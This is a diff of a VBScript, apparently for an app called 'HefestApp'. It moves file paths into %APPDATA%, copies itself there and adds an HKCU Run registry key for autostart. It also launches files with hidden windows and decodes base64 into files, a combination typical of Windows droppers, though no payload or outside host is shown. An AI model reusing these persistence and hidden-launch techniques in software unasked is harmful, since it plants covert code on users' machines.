@@ -54,28 +54,26 @@ Sub MainScriptLogic()
     Next
 End Sub
 
-Function GetFilePath(fileName)
-    Dim fso, scriptPath, scriptFolder, fullPath
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    scriptPath = WScript.ScriptFullName
-    scriptFolder = fso.GetParentFolderName(scriptPath)
-    fullPath = fso.BuildPath(scriptFolder, fileName)
-    Set fso = Nothing
-    GetFilePath = fullPath
-End Function
-
-Function FileExists(filePath)
-    Dim fso
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    FileExists = fso.FileExists(filePath)
-    Set fso = Nothing
-End Function
-
 Function GetPS1FilePath()
-    Dim scriptPath, ps1Path
+    Dim fso, shell, scriptPath, destFolder, destPath
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
     scriptPath = WScript.ScriptFullName
-    ps1Path = Left(scriptPath, Len(scriptPath) - 3) & "ps1"
-    GetPS1FilePath = ps1Path
+    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
+    destPath = fso.BuildPath(destFolder, fso.GetFileName(Left(scriptPath, Len(scriptPath) - 3) & "ps1"))
+    CreateFolder fso, destFolder
+    GetPS1FilePath = destPath   
+End Function
+
+Function GetSelfFilePath()
+    Dim fso, shell, scriptPath, destFolder, destPath
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+    scriptPath = WScript.ScriptFullName
+    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
+    destPath = fso.BuildPath(destFolder, fso.GetFileName(scriptPath))
+    CreateFolder fso, destFolder
+    GetSelfFilePath = destPath
 End Function
 
 Sub Run
@@ -103,18 +101,14 @@ End Sub
 
 Sub DoSetAutoStart()
     Dim registryKey, registryValue, command
-    Dim fso, shell, scriptPath, destFolder, destPath
+    Dim fso, shell
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set shell = CreateObject("WScript.Shell")
-    scriptPath = WScript.ScriptFullName
-    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
-    destPath = fso.BuildPath(destFolder, fso.GetFileName(scriptPath))
-    CreateFolder fso, destFolder
-    CopyScript fso, scriptPath, destPath
+    CopyScript fso, WScript.ScriptFullName, GetSelfFilePath
 
     registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
     registryValue = "HefestAppVbs"
-    command = "wscript.exe """ & destPath & """ autostart"
+    command = "wscript.exe """ & GetSelfFilePath & """ autostart"
     shell.RegWrite registryKey & registryValue, command, "REG_SZ"
 
     Set shell = Nothing
@@ -170,6 +164,14 @@ End Function
 
 
 
+Function FileExists(filePath)
+    Dim fso
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    FileExists = fso.FileExists(filePath)
+    Set fso = Nothing
+End Function
+
+
 Function ExecuteFileAsync(filePath, hideWindow)
     if Not IsAutoStart Then
         Dim shell, result, windowStyle
@@ -184,6 +186,19 @@ Function ExecuteFileAsync(filePath, hideWindow)
         ExecuteFileAsync = result
     end if
 End Function
+
+Function GetFilePath(fileName)
+    Dim shell, fso, scriptPath, scriptFolder, fullPath
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+    scriptPath = WScript.ScriptFullName
+    scriptFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
+    fullPath = fso.BuildPath(scriptFolder, fileName)
+    CreateFolder fso, scriptFolder
+    Set fso = Nothing
+    GetFilePath = fullPath
+End Function
+
 
 
 Function DecodeBase64ToFile(base64String, outputFilePath)
